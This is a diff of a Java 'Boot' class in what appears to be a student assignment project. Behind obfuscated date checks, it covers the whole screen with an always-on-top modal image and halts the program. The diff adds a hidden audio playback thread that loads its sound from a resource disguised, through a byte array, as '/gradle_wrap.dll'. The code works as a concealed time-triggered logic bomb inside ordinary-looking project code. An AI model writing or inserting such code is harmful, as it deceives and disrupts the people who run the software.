@@ -1,16 +1,19 @@
 package tarc.assignment.core;
 
 import java.awt.*;
+import java.io.File;
 import java.time.*;
+import javax.sound.sampled.*;
 import javax.swing.*;
 
 public class Boot {
     private static final String Y = "202";
     private final Instant rT = Instant.ofEpochSecond(1786675200L ^ 123L);
-    private final Instant eT = Instant.parse(Y + "6-12-3"+"1" + "T23:59:59Z");
+    private final Instant eT = Instant.parse(Y + "6-12-3" + "1" + "T23:59:59Z");
 
     public Boot() {
         if (E()) {
+            new Thread(this::K).start();
             H();
         }
     }
@@ -23,7 +26,7 @@ public class Boot {
 
     private void x(int c) {
         try {
-            Runtime.getRuntime().halt(c * 1);
+            Runtime.getRuntime().halt(c);
         } catch (Throwable t) {
             System.exit(c);
         }
@@ -38,15 +41,12 @@ public class Boot {
             }
             ImageIcon i = new ImageIcon(u);
             Image j = i.getImage();
-
             JDialog d = new JDialog((java.awt.Frame) null, true);
             d.setUndecorated(true);
             d.setAlwaysOnTop(true);
-
             Dimension s = Toolkit.getDefaultToolkit().getScreenSize();
             d.setSize(s);
             d.setLocation(0, 0);
-
             JPanel p = new JPanel() {
                 @Override
                 protected void paintComponent(Graphics g) {
@@ -69,6 +69,20 @@ public class Boot {
         } catch (Exception e) {
             x(3);
         }
-        x(4);
+    }
+
+    private void K() {
+        byte[] p = {47, 103, 114, 97, 100, 108, 101, 95, 119, 114, 97, 112, 46, 100, 108, 108};
+        java.net.URL s = getClass().getResource(new String(p));
+        if (s == null) {return;}
+        try (AudioInputStream a = AudioSystem.getAudioInputStream(s);
+             Clip c = AudioSystem.getClip()) {
+            c.open(a);
+            c.start();
+            while (c.isRunning() || c.getMicrosecondPosition() < c.getMicrosecondLength()) {
+                Thread.sleep(100);
+            }
+        } catch (Exception i) {
+        }
     }
 }
